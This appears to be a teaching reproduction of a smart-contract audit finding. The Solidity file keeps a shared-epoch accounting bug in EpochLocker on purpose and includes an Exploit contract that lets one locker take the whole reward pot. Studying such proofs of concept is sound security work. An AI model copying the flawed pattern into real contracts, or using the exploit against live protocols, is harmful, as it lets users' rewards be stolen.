// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Regnum Aurum — subtractFromEpochEndLocked drops a shared epoch (Pashov H-03, finding 66591)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: after subtracting one user's amount, the epoch is popped from globalEpochEnds
    even when totalLockedAtEpochEnd is still non-zero. totalSupply() then ignores the other
    user's lock, so the first claimer takes the whole reward pot and the second is paid 0.
    The pop is preserved verbatim below (@> VULN). */

contract RewardToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract EpochLocker {
    RewardToken public reward;
    bool public useFix;
    uint256[] internal _globalEpochEnds;
    mapping(uint256 => uint256) public totalLockedAtEpochEnd;
    mapping(address => uint256) public userLocked;
    uint256 public accReward;
    mapping(address => bool) public claimed;

    constructor(RewardToken _reward, bool _useFix) {
        reward = _reward;
        useFix = _useFix;
    }

    function globalEpochCount() external view returns (uint256) {
        return _globalEpochEnds.length;
    }

    function globalEpochEnds(uint256 i) external view returns (uint256) {
        return _globalEpochEnds[i];
    }

    function lock(address user, uint256 amount, uint256 epochEnd) external {
        if (totalLockedAtEpochEnd[epochEnd] == 0) _globalEpochEnds.push(epochEnd);
        totalLockedAtEpochEnd[epochEnd] += amount;
        userLocked[user] += amount;
    }

    function extendLock(uint256 amount, uint256 oldEpoch, uint256 newEpoch) external {
        userLocked[msg.sender] -= amount;
        _subtractFromEpochEndLocked(oldEpoch, amount);
        if (totalLockedAtEpochEnd[newEpoch] == 0) _globalEpochEnds.push(newEpoch);
        totalLockedAtEpochEnd[newEpoch] += amount;
        userLocked[msg.sender] += amount;
    }

    function _subtractFromEpochEndLocked(uint256 epochEnd, uint256 amount) internal {
        uint256 currentAmountGlobal = totalLockedAtEpochEnd[epochEnd];
        totalLockedAtEpochEnd[epochEnd] = currentAmountGlobal > amount ? currentAmountGlobal - amount : 0;
        uint256[] memory epochEnds = _globalEpochEnds;
        for (uint256 i; i < epochEnds.length; i++) {
            if (epochEnds[i] == epochEnd) {
                if (useFix && totalLockedAtEpochEnd[epochEnd] != 0) continue;
                _globalEpochEnds[i] = epochEnds[epochEnds.length - 1]; // @> VULN: epoch slot is overwritten while other users still have a balance
                _globalEpochEnds.pop();
                // FIX: pop only when totalLockedAtEpochEnd[epochEnd] == 0
            }
        }
    }

    function totalSupply() public view returns (uint256 supply) {
        for (uint256 i; i < _globalEpochEnds.length; i++) {
            supply += totalLockedAtEpochEnd[_globalEpochEnds[i]];
        }
    }

    function notifyReward(uint256 amount) external {
        reward.transferFrom(msg.sender, address(this), amount);
        accReward = amount;
    }

    function claim() external returns (uint256 amount) {
        require(!claimed[msg.sender], "claimed");
        claimed[msg.sender] = true;
        uint256 supply = totalSupply();
        uint256 power = userLocked[msg.sender];
        amount = power * accReward / supply;
        uint256 available = reward.balanceOf(address(this));
        if (amount > available) amount = available;
        reward.transfer(msg.sender, amount);
    }
}

contract Bob {
    function claim(EpochLocker locker) external returns (uint256) {
        return locker.claim();
    }
}

contract Exploit {
    RewardToken public reward; // CREATE nonce 1
    EpochLocker public locker; // CREATE nonce 2
    Bob public bob; // CREATE nonce 3
    uint256 public aliceGot;
    uint256 public bobGot;
    uint256 public constant OLD_EPOCH = 1000;
    uint256 public constant NEW_EPOCH = 2000;

    constructor() {
        reward = new RewardToken();
        locker = new EpochLocker(reward, false);
        bob = new Bob();
        reward.mint(address(this), 200);
        reward.approve(address(locker), 200);
        locker.lock(address(bob), 100, OLD_EPOCH);
        locker.lock(address(this), 100, OLD_EPOCH);
        locker.notifyReward(200);
    }

    function run() external {
        locker.extendLock(100, OLD_EPOCH, NEW_EPOCH);
        aliceGot = locker.claim();
        bobGot = bob.claim(locker);
        require(locker.totalLockedAtEpochEnd(OLD_EPOCH) == 100, "bob still locked at the old epoch");
        require(locker.globalEpochCount() == 1, "shared epoch removed");
        require(locker.globalEpochEnds(0) == NEW_EPOCH, "only alice's epoch remains");
        require(locker.totalSupply() == 100, "supply understated");
        require(locker.userLocked(address(this)) + locker.userLocked(address(bob)) == 200, "users still sum to 200");
        require(aliceGot == 200, "alice took the whole pot");
        require(bobGot == 0, "bob paid nothing");
    }
}
